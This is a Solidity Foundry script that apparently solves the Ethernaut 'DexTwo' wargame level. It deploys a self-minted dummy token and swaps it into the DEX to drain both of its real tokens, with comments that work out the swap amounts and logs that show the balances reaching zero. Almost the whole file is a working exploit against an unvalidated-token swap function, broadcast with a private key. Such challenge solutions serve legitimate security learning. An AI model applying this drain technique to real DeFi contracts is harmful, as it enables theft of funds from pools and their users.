// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { DexTwo } from "../src/level23.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@openzeppelin-contracts/contracts/utils/Strings.sol";
import "@openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

///@notice Manipulating own Token to drain Token1+Token2
contract Level23Solution is Script {
    DexTwo level = DexTwo(0xD507EA69259ca49ec04584665442eCce717747B9);
    
    function run () external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Step 1: Deploy your own Token3
        Token3 token3 = new Token3(1000);
        // Step 2: Transfer 100 Token3 to DexTwo contract so that it can perform a swap,
        // Approve DexTwo contract to swap 100 tokens,
        // Perform a swap from Token3 to Token1
        token3.transfer(address(level), 100);
        token3.approve(address(level), 100);
        level.swap(address(token3), level.token1(), 100);

        // DexTwo balances
        // After swapping, we can see DexTwo has Token1:0 and Token3:200
        console.log("Swap 1 - Draining Token1");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));
        console.log("Token3: ",level.balanceOf(address(token3), address(level)));
        
        
        // Next step is to drain 100 Token2. We know the calculation formula and we want it to return result as 100,
        // Formula -> (amount * to_balance) / from_balance,
        // (200 * 100[Token2 balance]) / 200[Token3 balance] = 100,
        // Hence, the amount of Token3 we need to swap is 200

        // Step 3: Approve DexTwo contract to swap 200 tokens
        // Perform a swap from Token3 to Token2
        token3.approve(address(level), 200);
        level.swap(address(token3), level.token2(), 200);

        
        // DexTwo balances
        // After swapping, Token2 is now drained and Token3 balance becomes 400
        console.log("Swap 2 - Draining Token2");
        console.log("Token1: ",level.balanceOf(level.token1(), address(level)));
        console.log("Token2: ",level.balanceOf(level.token2(), address(level)));
        console.log("Token3: ",level.balanceOf(address(token3), address(level)));

        /*
        DexTwo contract token balance logs
        Swap 1 - Draining Token1
        Token1:  0
        Token2:  100
        Token3:  200

        Swap 2 - Draining Token2
        Token1:  0
        Token2:  0
        Token3:  400
        */

        vm.stopBroadcast();
    }
}

contract Token3 is ERC20 {
    constructor(uint256 initialSupply) ERC20("Token3", "TK3") {
        _mint(msg.sender, initialSupply);
    }
}
